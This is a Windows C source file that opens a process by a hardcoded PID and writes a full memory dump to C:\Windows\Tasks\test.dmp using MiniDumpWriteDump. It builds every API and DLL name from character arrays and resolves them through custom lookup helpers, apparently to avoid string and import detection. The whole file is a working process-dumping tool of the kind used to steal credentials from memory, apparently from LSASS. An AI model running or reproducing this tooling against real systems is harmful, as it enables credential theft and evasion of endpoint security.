#include <Windows.h>
#include "structs.h"
#include "helpers.h"
//#include <stdio.h>

// #pragma comment(linker, "/entry:WinMain")

// int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
//     LPSTR lpCmdLine, int nCmdShow)
int main()
{

    WCHAR kern32[] = { L'K', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', 0};
    char sCreateFile[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'A', 0};

    pCreateFileA CreateFileA = (pCreateFileA) hlpGetProcAddress(hlpGetModuleHandle(kern32), sCreateFile);

    char fileName[] = { 'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'T', 'a', 's', 'k', 's', '\\', 't', 'e', 's', 't', '.', 'd', 'm', 'p', 0 };
    // FILE_ATTRIBUTE_HIDDEN FILE_ATTRIBUTE_SYSTEM
    HANDLE hFile = CreateFileA(fileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return 1;


    char sOpenProcess[] = { 'O', 'p', 'e', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's', 0};

    pOpenProcess OpenProcess = (pOpenProcess) hlpGetProcAddress(hlpGetModuleHandle(kern32), sOpenProcess);
    if (OpenProcess == NULL)
        return NULL;

    //DWORD pid = 1364;
    DWORD pid = 37124;

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
    // HANDLE hProc = OpenProcess(0x001F0FFF, FALSE, pid);
    if (hProc == NULL)
        return 1;


    char loadlib[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0 };
    pLoadLibraryA LoadLibraryA = hlpGetProcAddress(hlpGetModuleHandle(kern32), loadlib);
    if (LoadLibraryA == NULL)
        return 1;

    //char dbghlp[] = { 'D', 'b', 'g', 'h', 'e', 'l', 'p', '.', 'd', 'l', 'l', 0};
    // HMODULE Hdbghlp = LoadLibraryA(dbghlp);

    char dbgcore[] = { 'D', 'b', 'g', 'c', 'o', 'r', 'e', '.', 'd', 'l', 'l', 0};
    HMODULE Hdbgcore = LoadLibraryA(dbgcore);
    if (Hdbgcore == NULL)
        return 1;


    char sminid[] = {'M', 'i', 'n', 'i', 'D', 'u', 'm', 'p', 'W', 'r', 'i', 't', 'e', 'D', 'u', 'm', 'p', 0};
    //pMiniDumpWriteDump MiniDumpWriteDump = (pMiniDumpWriteDump) hlpGetProcAddress(hlpGetModuleHandle(dbghlp), sminid);
    pMiniDumpWriteDump MiniDumpWriteDump = (pMiniDumpWriteDump) hlpGetProcAddress(Hdbgcore, sminid);
    if (MiniDumpWriteDump == NULL)
        return 1;


    //BOOL dumped = MiniDumpWriteDump(hProc, 0, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
    BOOL dumped = MiniDumpWriteDump(hProc, pid, hFile, 2, NULL, NULL, NULL);
    if (!dumped)
    {
        return 1;
    }

    char sCloseHandle[] = {'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0};
    pCloseHandle CloseHandle = (pCloseHandle) hlpGetProcAddress(hlpGetModuleHandle(kern32), sCloseHandle);
    CloseHandle(hFile);
    CloseHandle(hProc);

    return 0;
}